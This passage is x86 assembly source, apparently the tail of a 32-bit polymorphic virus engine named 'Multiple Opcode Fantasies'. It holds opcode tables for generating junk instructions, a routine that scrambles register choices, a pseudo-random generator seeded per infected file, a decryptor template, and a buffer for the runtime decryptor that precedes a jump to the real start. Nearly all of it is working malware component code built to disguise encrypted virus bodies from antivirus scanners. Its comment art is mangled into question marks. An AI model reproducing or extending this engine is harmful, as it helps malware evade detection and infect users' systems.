;? MOD/RM AND SIB BYTE VALUES FOR ALL ADDRESSING MODES USED                 ?
;???????????????????????????????????????????????????????????????????????????�
;? AL   CL   DL   BL   AH   CH   DH   BH    ? 8BIT REGISTER                 ?
;? AX   CX   DX   BX   SP   BP   SI   DI    ? 16BIT REGISTER                ?
;? EAX  ECX  EDX  EBX  ESP  EBP  ESI  EDI   ? 32BIT REGISTER                ?
;? 0    1    2    3    4    5    6    7     ? ORDER                         ?
;? 000  001  010  011  100  101  110  111   ????????????????????????????????�
;? MOD/RM VALUE: (MOD = 00)                 ?16BIT ADDR ?32BIT AD.?SCALE    ?
;????????????????????????????????????????????????????????????????????????????
db 000h,008h,010h,018h,020h,028h,030h,038h ;?[BX+SI]    ?[EAX]    ?[EAX]    ?
db 001h,009h,011h,019h,021h,029h,031h,039h ;?[BX+DI]    ?[ECX]    ?[ECX]    ?
db 002h,00Ah,012h,01Ah,022h,02Ah,032h,03Ah ;?[BP+SI]    ?[EDX]    ?[EDX]    ?
db 003h,00Bh,013h,01Bh,023h,02Bh,033h,03Bh ;?[BP+DI]    ?[EBX]    ?[ECX]    ?
db 004h,00Ch,014h,01Ch,024h,02Ch,034h,03Ch ;?[SI]       ?[--]     ?NONE     ?
db 005h,00Dh,015h,01Dh,025h,02Dh,035h,03Dh ;?[DI]       ?D32      ?[EBP]    ?
db 006h,00Eh,016h,01Eh,026h,02Eh,036h,03Eh ;?D16        ?[ESI]    ?[ESI]    ?
db 007h,00Fh,017h,01Fh,027h,02Fh,037h,03Fh ;?[BX]       ?[EDI]    ?[EDI]    ?
; MOD/RM VALUE: (MOD = 01)                  ?           ?         ?         ?
db 040h,048h,050h,058h,060h,068h,070h,078h ;?[BX+SI+D8] ?[EAX+D8] ?[EAX*2]  ?
db 041h,049h,051h,059h,061h,069h,071h,079h ;?[BX+DI+D8] ?[ECX+D8] ?[ECX*2]  ?
db 042h,04Ah,052h,05Ah,062h,06Ah,072h,07Ah ;?[BP+SI+D8] ?[EDX+D8] ?[EDX*2]  ?
db 043h,04Bh,053h,05Bh,063h,06Bh,073h,07Bh ;?[BP+DI+D8] ?[EBX+D8] ?[EBX*2]  ?
db 044h,04Ch,054h,05Ch,064h,06Ch,074h,07Ch ;?[SI+D8]    ?[--+D8]  ?NONE     ?
db 045h,04Dh,055h,05Dh,065h,06Dh,075h,07Dh ;?[DI+D8]    ?[EBP+D8] ?[EBP*2]  ?
db 046h,04Eh,056h,05Eh,066h,06Eh,076h,07Eh ;?[BP+D8]    ?[ESI+D8] ?[ESI*2]  ?
db 047h,04Fh,057h,05Fh,067h,06Fh,077h,07Fh ;?[BX+D8]    ?[EDI+D8] ?[EDI*2]  ?
; MOD/RM VALUE (MOD = 10)                   ?           ?         ?         ?
db 080h,088h,090h,098h,0A0h,0A8h,0B0h,0B8h ;?[BX+SI+D16]?[EAX+D32]?[EAX*4]  ?
db 081h,089h,091h,099h,0A1h,0A9h,0B1h,0B9h ;?[BX+DI+D16]?[ECX+D32]?[ECX*4]  ?
db 082h,08Ah,092h,09Ah,0A2h,0AAh,0B2h,0BAh ;?[BP+SI+D16]?[EDX+D32]?[EDX*4]  ?
db 083h,08Bh,093h,09Bh,0A3h,0ABh,0B3h,0BBh ;?[BP+DI+D16]?[EBX+D32]?[EBX*4]  ?
db 084h,08Ch,094h,09Ch,0A4h,0ACh,0B4h,0BCh ;?[SI+D16]   ?[--+D32] ?NONE     ?
db 085h,08Dh,095h,09Dh,0A5h,0ADh,0B5h,0BDh ;?[DI+D16]   ?[EBP+D32]?[EBP*4]  ?
db 086h,08Eh,096h,09Eh,0A6h,0AEh,0B6h,0BEh ;?[BP+D16]   ?[ESI+D32]?[ESI*4]  ?
db 087h,08Fh,097h,09Fh,0A7h,0AFh,0B7h,0BFh ;?[BX+D16]   ?[EDI+D32]?[EDI*4]  ?
; MOD/RM VALUE (MOD = 11)                   ?           ?         ?         ?
db 0C0h,0C8h,0D0h,0D8h,0E0h,0E8h,0F0h,0F8h ;?EAX/AX/AL  ?EAX/AX/AL?[EAX*8]  ?
db 0C1h,0C9h,0D1h,0D9h,0E1h,0E9h,0F1h,0F9h ;?ECX/CX/CL  ?ECX/CX/CL?[ECX*8]  ?
db 0C2h,0CAh,0D2h,0DAh,0E2h,0EAh,0F2h,0FAh ;?EDX/DX/DL  ?EDX/DX/DL?[EDX*8]  ?
db 0C3h,0CBh,0D3h,0DBh,0E3h,0EBh,0F3h,0FBh ;?EBX/BX/BL  ?EBX/BX/BL?[EBX*8]  ?
db 0C4h,0CCh,0D4h,0DCh,0E4h,0ECh,0F4h,0FCh ;?ESP/SP/AH  ?ESP/SP/AH?NONE     ?
db 0C5h,0CDh,0D5h,0DDh,0E5h,0EDh,0F5h,0FDh ;?EBP/BP/CH  ?EBP/BP/CH?[EBP*8]  ?
db 0C6h,0CEh,0D6h,0DEh,0E6h,0EEh,0F6h,0FEh ;?ESI/SI/DH  ?ESI/SI/DH?[ESI*8]  ?
db 0C7h,0CFh,0D7h,0DFh,0E7h,0EFh,0F7h,0FFh ;?EDI/DI/BH  ?EDI/DI/BH?[EDI*8]  ?
; ???????????????????????????????????????????????????????????????????????????

; The prefixes:
Operand_size_toggle     db 66h   ; changes between 16bit and 32bit operands
Address_size_toggle     db 67h   ; changes between 16bit and 32bit addressing

; The toggle bytes (applied by XORing the OpCode with them):
Direction_toggle        db 02h   ; toggles operand->address and address->op.
Size_toggle             db 01h   ; toggles between 8bit and 16bit operators

; The immediate values used:
disp8                   db 0     ; 8bit displacement
disp16                  dw 0     ; 16bit displacement
disp32                  dd 0     ; 32bit displacement

; Reg to/from Address: (second byte 0=only junk register / 1=any register)

Table1 label
db 000h, 0      ; ADD            Explanation:
db 008h, 0      ; OR                - unchaged = 8bit addr  -> 8bit reg
db 010h, 0      ; ADC               - +1       = 16bit addr -> 16bit reg
db 018h, 0      ; SBB               - +2       = 8bit reg   -> 8bit addr
db 020h, 0      ; AND               - +3       = 16bit reg  -> 16bit addr
db 028h, 0      ; SUB
db 030h, 0      ; XOR
db 038h, 1      ; CMP
db 088h, 0      ; MOV
Table1_len = ($-offset Table1)/2

Table2 label
db 084h, 1      ; TEST              - unchanged = 8bit  -> 8bit
db 086h, 0      ; XCHG                +1        = 16bit -> 16bit
Table2_len = ($-offset Table2)/2

Table3 label
db 040h, 0      ; INC               +reg number = INC reg
db 048h, 0      ; DEC               +reg number = DEC reg
db 050h, 0      ; PUSH              +reg number = PUSH reg
db 058h, 0      ; POP               +reg number = POP reg
Table3_len = ($-offset Table3)/2

Table4 label
db 070h, 0      ; Conditonal Jump   +0 .. +0Fh  = jump condition
Table4_len = ($-offset Table4)/2

Table5 label
db 0B0h, 0      ; Mov immediate to 8bit reg      +reg number = mov to reg
db 0B8h, 0      ; Mov immediate to 16/32bit reg  +reg number = mov to reg
Table5_len = ($-offset Table5)/2

Table6 label
db 080h, 0     ; Long conditional jmp
Table6_len = ($-offset Table6)/2

Table7 label
   clc
db 0
   stc
db 0
   cli
db 0
   sti
db 0
   cld
db 0
Table7_len = ($-offset Table7)/2

Tables label                            ; this is useless in this
       dd offset Table1                 ; version
       dd offset Table2                 ;
       dd offset Table3                 ;
       dd offset Table4                 ;
       dd offset Table5                 ;
       dd offset Table6                 ;
       dd offset Table7                 ;
                                        ;
Table_numbers = ($-offset Tables)/4     ; this is useful...

address_save    dd 0
junk_finish     dd 0
flawable        dw 0
we_create_jcond db 0
first_intend    dd 0

;                  ?굅                                ?
;                  ?�    Junk Generator Module End   �?
;                  ?                                갚?

;????????????????????????????????????????????????????????????????????????????



;?????????????????????????????????????????????????????????????????????????????
;? Here we have the place where the engine chooses the random stuff.         ?
;?????????????????????????????????????????????????????????????????????????????

Choose_random_registers Proc Near         ; Here we choose the random regs
        pushad                            ;
        lea edi, [ebp+used_registers]     ; point to registers
        lea esi, [ebp+used_registers]     ; point to registers
        mov edx, esi                      ; save position
        mov ecx, 50h                      ; scramble 50h times
                                          ;
mangle:                                   ;
        mov eax, 7                        ;
        call brandom32                    ; choose a random nr. between 0-6
        mov ebx, eax                      ; in EBX
        mov eax, 7                        ;
        call brandom32                    ; choose a random nr. between 0-6
        cmp ebx, eax                      ; in EAX
        je mangle                         ; if EAX=EBX choose again
        add edi, eax                      ; increment first pointer
        add esi, ebx                      ; increment second pointer
        mov al, byte ptr [edi]            ; and exchange the values
        xchg byte ptr [esi], al           ; between them
        mov byte ptr [edi], al            ;
        mov edi, edx                      ; restore position
        mov esi, edx                      ;
        loop mangle                       ; and do it 50h times
        popad                             ;
        Retn                              ;
Choose_random_registers Endp              ;
                                          ;
randomize proc near                       ;
       push eax                           ; this randomize procedure must
       mov eax, dword ptr [esp-8]         ; be called first when the word
       add dword ptr [ebp+seed], eax      ; on the stack is smth. like
       pop eax                            ; 0BF87.... and it is different
       ret                                ; for each loaded file depending
randomize endp                            ; on different thingies. The
                                          ; seed gets incremented anyway
random32 proc near                        ; from generation to generation.
       push ecx                           ;
       xor ecx, ecx                       ;
       mov eax, dword ptr [ebp+seed]      ;
       mov cx, 33                         ;
                                          ;
rloop:                                    ;
       add eax, eax                       ;
       jnc $+4                            ;
       xor al, 197                        ;
       loop rloop                         ;
       mov dword ptr [ebp+seed], eax      ;
       pop ecx                            ;
       ret                                ;
random32 endp                             ;
seed dd 0BFF81234h                        ;
                                          ;
brandom32 proc near                       ;
       push edx                           ; this procedure expects a value
       push ecx                           ;
       mov edx, 0                         ; in EAX and returns a random
       push eax                           ; number in EAX but smaller than
       call random32                      ; EAX's original value. Actually
       pop ecx                            ; it bounds EAX (0<=EAX<=limit-1)
       div ecx                            ; EDX and ECX are preserved
       xchg eax, edx                      ;
       pop ecx                            ;
       pop edx                            ;
       ret                                ;
brandom32 endp                            ;


;?????????????????????????????????????????????????????????????????????????????
;? Here we have the data on the decryptor generation.                        ?
;?????????????????????????????????????????????????????????????????????????????

decryptor:
i01:  mov ebx, 0                  ; mov preg, code_start
      db 0feh                     ;
i02:  mov ebx, 0                  ; mov kreg, key
      db 0feh                     ;
i03:  mov ebx, 0                  ; mov lreg, code_length/8
      db 0feh                     ;
i04:  mov ebx, dword ptr [ebx]    ; mov creg, [preg] (mainloop)
      db 0feh                     ;
i05:  add ebx, ecx                ;  creg, kreg
      db 0feh                     ;
i06:  ror ebx, 0h                 ;  creg, key2
      db 0feh                     ;
i07:  add ebx, dword ptr [ebx+4]  ;  creg, [preg+4]
      db 0feh                     ;
i08:  mov dword ptr [ebx], ebx    ; mov [preg], creg
      db 0feh                     ;
i09:  add ebx, 12345678h          ;  kreg, keyvalue
      db 0feh                     ;
i10:  add ebx, 4                  ; sub preg, 4
      db 0feh                     ;
i11:  sub ebx, 1                  ; sub lreg, 1
      db 0feh                     ;
i12:  ;jnz 0                      ; jnz mainloop
      db 0fh, 85h                 ;
      dd 0feh                     ;
      db 0ffh                     ;

;?????????????????????????????????????????????????????????????????????????????
;? Here we have the engine's general data.                                   ?
;?????????????????????????????????????????????????????????????????????????????

un_op_code1:
       db 33h                ; XOR
       db 2Bh                ; ADD
       db 03h                ; SUB
                             ;
un_op_code2:                 ;
       db 81h, 11110000b     ; XOR
       db 81h, 11101000b     ; SUB
       db 81h, 11000000b     ; ADD
                             ;
un_op_code3:                 ;
       db 11000000b          ; ROL
       db 11001000b          ; ROR
                             ;
key   dd 0                   ;
key2  dd 0                   ;
keyvalue dd 0                ;
op1 dd 0                     ;
op2 dd 0                     ;
op3 dd 0                     ;
op4 dd 0                     ;
                             ;
used_registers:              ;
creg  Db 0                   ; Register to hold the code
lreg  Db 1                   ; Register to hold the length of code
kreg  Db 2                   ; Register to hold the encryption key
preg  Db 3                   ; Register to hold the pointer in code
jreg1 Db 5                   ; Junk register #1
jreg2 Db 6                   ; Junk register #2
jreg3 Db 7                   ; Junk register #3
                             ;
counter dd 0                 ; instruction counter
misc db 0                    ; misc data
codeaddr dd 0                ; address of code
codelength dd 0              ; code length
mainlp dd 0                  ; main loop address
the_end   dd 0               ;
end_end   dd 0               ;
                             ;
increment_flag db 0          ; flag
                             ;
MOF32 endp                   ;

;   ????? ????? ????? ????? ????? ????? ????? ????? ????? ????? ????? ?????
;   ? ? ? ? ? ? ? ? ? ? ? ? ? ? ? ? ? ? ? ? ? ? ? ? ? ? ? ? ? ? ? ? ? ? ? ?
;   ????? ????? ????? ????? ????? ????? ????? ????? ????? ????? ????? ?????
;   ?????                                                             ?????
;   ? ? ? M?U?L?T?I?P?L?E  O?P?C?O?D?E  F?A?N?T?A?S?I?E?S  3?2  B?I?T ? ? ?
;   ?????                            e n d                            ?????
;   ????? ????? ????? ????? ????? ????? ????? ????? ????? ????? ????? ?????
;   ? ? ? ? ? ? ? ? ? ? ? ? ? ? ? ? ? ? ? ? ? ? ? ? ? ? ? ? ? ? ? ? ? ? ? ?
;   ????? ????? ????? ????? ????? ????? ????? ????? ????? ????? ????? ?????

end_of_code:
decrypt:                       ; where the runtime decryptor gets put...
         db  700h dup (90h)    ;
         jmp realstart         ;
end:                           ;
end start                      ;
end                            ;




